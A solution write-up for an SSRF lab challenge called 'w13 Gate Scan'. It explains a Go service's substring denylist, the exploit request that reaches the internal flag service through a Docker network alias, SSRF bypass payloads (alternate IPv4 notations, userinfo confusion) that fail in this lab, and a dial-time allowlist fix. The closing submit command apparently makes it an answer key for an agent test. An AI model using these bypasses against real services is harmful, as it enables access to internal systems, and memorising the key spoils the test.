# w13 Gate Scan :: solution

## Root cause

`app/main.go`, `handleScan()`:

```go
u, err := parseTarget(raw)
if err != nil { ... }

if blocked(u.Host) {
    writeJSON(w, http.StatusForbidden, map[string]string{"error": "blocked: internal range", "host": u.Host})
    return
}

// VULNERABLE: the host string was screened, but nothing checked the address
// it resolves to, and no allowlist constrains the destination.
resp, err := client.Get(u.String())
```

and the guard itself:

```go
func blocked(host string) bool {
	h := strings.ToLower(host)
	return strings.Contains(h, "internal") || strings.Contains(h, "169.254.169.254")
}
```

The control is a **denylist over a hostname string**. That is the wrong shape of
control, for two reasons:

1. **It screens a name, not an address.** The fetch is performed by Go's HTTP
   client, which resolves whatever name it is given. Nothing re-checks the
   resolved IP, so any name that resolves into the private network is reachable
   unless it happens to be spelled on the list.
2. **The list is not the set of names the service has.** The farm is reachable
   under every alias it advertises, and only the canonical one was ever added to
   the guard. A migration that added a second name silently widened the gap.

In this lab the second reason is the exploitable one.

## Recon

The landing page states the policy:

```
BLOCKED   any host containing internal
BLOCKED   any host containing 169.254.169.254
ALLOWED   everything else
```

The ops endpoint names the farm:

```bash
curl -s http://localhost:30013/api/health
# {"service":"gate-scan","statusfarm_host":"statusfarm:9000","uptime":13,"version":"0.13.2"}
```

`statusfarm` does not contain the substring `internal`. Confirm the canonical
name is still refused, so you know the guard is genuinely live and you are not
just looking at a broken service:

```bash
curl -s -X POST http://localhost:30013/scan \
  -H 'content-type: application/json' \
  -d '{"url":"http://w0b-w13-internal:9000/secret"}'
# {"error":"blocked: internal range","host":"w0b-w13-internal:9000"}
```

## Exploit

Ask the prober for the alias instead:

```bash
curl -s -X POST http://localhost:30013/scan \
  -H 'content-type: application/json' \
  -d '{"url":"http://statusfarm:9000/secret"}'
```

```json
{
  "target": "http://statusfarm:9000/secret",
  "status": 200,
  "body": "{\"flag\":\"hex4b0t{...}\"}\n"
}
```

Both names resolve to the same container — `docker-compose.yml` gives the
internal service `aliases: [statusfarm]` alongside its `container_name`:

```yaml
container_name: w0b-w13-internal
networks:
  w0b:
    aliases:
      - statusfarm
```

That is the whole bug. There is no encoding trick and no parser confusion here:
the guard simply does not know one of the service's names.

The farm also is not reachable directly from the host, so the SSRF is the only
route in:

```bash
curl -s http://localhost:9000/secret
# (connection refused - no host port is published)
```

## What was tested and does NOT work

Worth recording, because the obvious payloads are dead ends on modern Go:

**Alternate IPv4 notations are rejected by the resolver.** The usual
`0x7f000001`, `2130706433` and `017700000001` forms for `127.0.0.1` do not
resolve in Go's pure-Go resolver:

```
0x7f000001      lookup err: no such host
2130706433      lookup err: no such host
017700000001    lookup err: no such host
127.1           lookup err: no such host
```

Only a real dotted quad works, so that family of payloads is unavailable here.
(It remains viable against stacks that use libc `getaddrinfo` semantics; Go is
stricter.)

**Userinfo confusion** — `http://w0b-w13-internal@127.0.0.1:9000/secret` — does
set `u.Host` to `127.0.0.1:9000` and would slip the guard, but the farm is a
separate container, so loopback leads nowhere. It is a real technique that does
not happen to pay off in this topology.

## The fix

A denylist over names cannot work: names are not enumerable by the defender.
Use an allowlist, and enforce it at dial time so redirects and DNS rebinding
cannot escape it:

```go
// Allow only the destinations you mean to support, then re-check the resolved
// address at connect time.
dialer := &net.Dialer{
    Control: func(network, address string, c syscall.RawConn) error {
        host, _, _ := net.SplitHostPort(address)
        ip := net.ParseIP(host)
        if ip == nil || ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() {
            return fmt.Errorf("blocked destination %s", address)
        }
        return nil
    },
}
client := &http.Client{Transport: &http.Transport{DialContext: dialer.DialContext}}
```

Screening the string the user typed is not a security boundary; checking the
address actually dialed is.

## Flag

Injected at runtime via `W0B_FLAG` into the internal service only. There is no
static value to hardcode.

## Submit

```bash
./manage.sh submit 'hex4b0t{...}' ai-pilot
```
